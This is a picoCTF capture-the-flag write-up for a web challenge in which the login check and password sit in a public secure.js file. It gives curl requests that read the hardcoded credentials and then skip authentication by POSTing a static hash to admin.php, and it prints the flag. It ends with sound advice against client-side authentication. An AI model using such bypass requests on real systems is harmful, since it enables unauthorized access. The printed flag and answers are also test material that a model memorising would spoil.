# Client-Side Authentication — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | Client-Side Authentication                     |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://saturn.picoctf.net:60379/`             |

**Description:**
Can you get the flag? Go to this website and see what you can discover.

---

## Solution

### Step 1: Explore the Login Page

The website shows a "Secure Customer Portal" with a login form that posts to `login.php`.

```bash
curl -s http://saturn.picoctf.net:60379/
```

```html
<form role="form" action="login.php" method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" name="login">Login</button>
</form>
```

---

### Step 2: Submit a Login and Analyze the Response

Submitting any credentials (e.g. `admin`/`admin`) returns a page with interesting JavaScript:

```bash
curl -s -X POST http://saturn.picoctf.net:60379/login.php \
  -d 'username=admin&password=admin'
```

The response contains:

1. A reference to `secure.js`
2. A hidden form that submits to `admin.php`
3. Client-side JavaScript that checks the password and, if valid, submits a hash to `admin.php`

```html
<script src="secure.js"></script>

<form hidden action="admin.php" method="post" id="hiddenAdminForm">
    <input type="text" name="hash" required id="adminFormHash">
</form>
```

```javascript
loggedIn = checkPassword(window.username, window.password);

if(loggedIn) {
    document.getElementById('msg').innerHTML = "Log In Successful";
    document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
    document.getElementById('hiddenAdminForm').submit();
}
```

---

### Step 3: Read the Password from secure.js

The `checkPassword` function is loaded from `secure.js` — a file that anyone can read:

```bash
curl -s http://saturn.picoctf.net:60379/secure.js
```

```javascript
function checkPassword(username, password) {
    if (username === 'admin' && password === 'strongPassword098765') {
        return true;
    } else {
        return false;
    }
}
```

The credentials are hardcoded in plain text: `admin` / `strongPassword098765`.

---

### Step 4: Get the Flag

At this point there are two ways to get the flag:

**Option A: Login with the discovered credentials**

Use the credentials found in `secure.js` to login through the form normally.

**Option B: Submit the hash directly (skip authentication entirely)**

Since we already know the hash value from the JavaScript (`2196812e91c29df34f5e217cfd639881`), we can POST it directly to `admin.php`:

```bash
curl -s -X POST http://saturn.picoctf.net:60379/admin.php \
  -d 'hash=2196812e91c29df34f5e217cfd639881'
```

**Result:**

```
picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}
```

Option B demonstrates a deeper issue — not only are the credentials exposed client-side, but the "authorization" to access the admin page is just a static hash with no server-side session validation.

---

## Flag

```
picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}
```

---

## Key Takeaways

1. **Never do authentication on the client side.** JavaScript runs in the user's browser, meaning all code is fully visible and modifiable. Authentication and authorization must always be handled on the server.

2. **JavaScript files are public.** Any `.js` file loaded by the browser can be read by anyone. Never store passwords, API keys, secrets, or sensitive logic in JavaScript files.

3. **Hidden forms provide no security.** The `hidden` attribute on the form only hides it visually — it's still fully present in the HTML source. An attacker can read the hash value and submit it directly.

4. **The flag name says it all.** `j5_15_7r4n5p4r3n7` (JS is transparent) — JavaScript is transparent by design. Everything sent to the browser is visible to the user. This is a fundamental property of client-side code, not a bug.
